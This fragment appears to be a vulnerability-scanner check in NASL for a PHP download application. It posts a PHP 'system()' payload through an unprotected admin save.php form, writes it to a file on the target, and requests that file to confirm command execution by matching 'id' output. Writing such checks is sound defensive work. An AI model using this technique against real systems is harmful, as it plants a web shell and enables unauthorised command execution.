...
filename = NASLString( vtstrings["lowercase_rand"], ".php" );
cmd = "id";
code = urlencode( str: NASLString( "<?php system(", cmd, "); ?>" ) );
for dir in nasl_make_list_unique( "/easydownload", "/phpeasydownload", "/download", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = NASLString( dir, "/file_info/admin/save.php" );
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(!res){
		continue;
	}
	if(ContainsString( res, "# of Accesses:" )){
		data = NASLString( "description=0&moreinfo=", code, "&accesses=0&filename=", filename, "&date=&B1=Submit" );
		attackreq = http_post( port: port, item: url, data: data );
		attackreq = ereg_replace( string: attackreq, pattern: "Content-Length: ", replace: NASLString( "Content-Type: application/x-www-form-urlencoded\\r\\nContent-Length: " ) );
		attackres = http_keepalive_send_recv( port: port, data: attackreq, bodyonly: TRUE );
		if(!attackres){
			continue;
		}
		http_check_remote_code( unique_dir: dir, check_request: NASLString( "/file_info/descriptions/", filename, ".0" ), check_result: "uid=[0-9]+.*gid=[0-9]+.*", command: "id", port: port );
	}
}
exit( 0 );
